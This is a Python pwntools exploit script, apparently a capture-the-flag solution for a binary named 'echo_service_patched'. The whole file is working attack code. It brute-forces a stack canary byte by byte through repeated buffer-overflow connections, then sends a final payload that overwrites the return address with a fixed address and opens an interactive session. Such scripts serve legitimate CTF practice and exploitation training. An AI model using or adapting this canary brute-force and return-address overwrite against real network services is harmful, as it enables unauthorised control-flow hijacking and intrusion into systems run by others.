#!/usr/bin/env python3

from pwn import *

exe = ELF("./echo_service_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    canary = b""
    #distance = 0x17
    r.recvuntil(b"port ")
    port = r.recvuntil(b" ")
    log.success(b"Found Port " + port)
    for j in range(8):
        for i in range(256):
            try:
                log.success("checking " + str(i))
                io = remote('0.0.0.0', int(port))
                print(b"sending " + b"A"*0x18 + canary + i.to_bytes(1, 'little'))
                io.send(b"A"*0x18 + canary + i.to_bytes(1, 'little'))
                io.recv(timeout = 5)
                io.sendline("exit")
                line = io.recvall(timeout = 0.1)
                print(line)
                io.close()
                r.recv()
                if (b"Exiting." in line):
                    canary += i.to_bytes(1, 'little')
                    log.success("Canary currently " + repr(canary))
                    break
            finally:
                try:
                    io.close()
                except:
                    pass


    io = remote('0.0.0.0', int(port))
    ret_addr = 0x0040168c
    io.send(b"A"*0x18 + canary + b"\x04" + b"\x00"*7 + p64(ret_addr))
    io.sendline("exit")
    io.interactive()
    io.close()
    r.interactive()


if __name__ == "__main__":
    main()
